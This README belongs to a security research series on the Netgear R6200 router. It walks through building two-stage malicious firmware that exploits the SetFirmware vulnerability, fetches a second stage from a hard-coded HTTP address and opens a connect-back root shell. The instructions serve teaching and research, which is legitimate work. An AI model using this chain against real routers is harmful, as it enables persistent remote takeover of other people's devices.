##Broken, Abandoned, and Forgotten Code, Part 14

This code corresponds with [part 14](http://shadow-file.blogspot.com/2015/11/abandoned-part-14.html) of the Broken, Abandoned, and Forgotten Code series. In this part we build the second stage firmware image that will be flashed to the device by stage 1 and, after rebooting, will provide a remote root session.

There have been substantial changes to the part 14 code from the previous part. While ``setfirmware.py`` is still present, there is a new exploit script, ``firmware_exploit.py``. This script uses classes declared in the former. It also provides the various connect-back servers you require to serve connections to the first and second stage payloads. It requires no command line arguments. Instead, configuration parameters are specified in ``environment.py``, which is thoroughly documented.

A build system to create the stage 1 and 2 firmware images can be found in payload-src. However, there are a few pieces I didn't include due to licensing.

* Kernel image (proprietary Netgear EULA)
* Root filesystem (proprietary Netgear EULA)
* mtd writing utility from OpenWRT (GPL licensed)

You can extract the filesystem and kernel from a stock Netgear firmware image. I used and tested the Netgear firmware R6200-V1.0.0.28_1.0.24.chk:

    $ md5sum R6200-V1.0.0.28_1.0.24.chk
    0bbb9004c8cddf2d9602719c34c9e33e  R6200-V1.0.0.28_1.0.24.chk

Identify the offsets and sizes of the kernel and filesystem components using binwalk, and then extract them using `dd`:

     $ dd if=R6200-V1.0.0.28_1.0.24.chk of=squashfs.bin skip=1328446 bs=1
     $ dd if=R6200-V1.0.0.28_1.0.24.chk of=kernel-lzma.bin skip=86 bs=1 count=1328360

Put ``kernel-lzma.bin`` into payload-src/.

Unpack the squashfs.bin into a root filesystem. Extracting a SquashFS filesystem is beyond the scope of this documentation.

You'll need to put a copy of the non-minimized root filesystem in place for stage 2. Put an unmodified ``rootfs.tar.gz`` in ``exploit-src/stage2/src/``.

Then, you'll need to generate a minimized root filesytem directory as described in [part 11](http://shadow-file.blogspot.com/2015/07/abandoned-part-11.html).

Tar up your minimized root filesystem, and put ``rootfs.tar.gz`` in ``exploit-src/stage1/src/``.

The mtd writer is responsible for flashing the stage 2 firmware image. I have modified this utility from OpenWRT to work with this project. Check out the source and put it in place:

    $ git clone https://github.com/zcutlip/mtdwriter.git
    $ tar zcvf broken_abandoned/part_13/exploit-src/stage1/src/mtdwriter.tar.gz mtdwriter/

You'll also need a little endian MIPS gcc toolchain. Ensure ``mipsel-linux-gcc`` and friends are in your ``$PATH``.

With the missing pieces in place, you can build the stage 1 and 2 firmware images:

    $ cd exploit-src/
    $ ./buildmipsel.sh

This will generate ``stage1.chk`` and ``stage2mtd.bin`` files. Put them in the SRVROOT directory specified in ``environment.py``.

With this update, assuming you've generated a working, minimized firmware, you should be able to exploit the ``SetFirmware`` vulnerability, and flash your firmware image to the router. Edit environment.py and specify the appropriate connect-back ports, target IP address and port, names of stage 1 and 2 files, and the directory to serve them out of. Then run:

``./firmware_exploit.py``

Upon rebooting, the stage 1 firmware will attempt to download the second stage from ``http://10.12.34.56:8080/stage2mtd.bin``. Then, if all goes well, there is a second reboot and then a connect-back shell to the IP address and port you specified in the ``telnetenabled`` script.
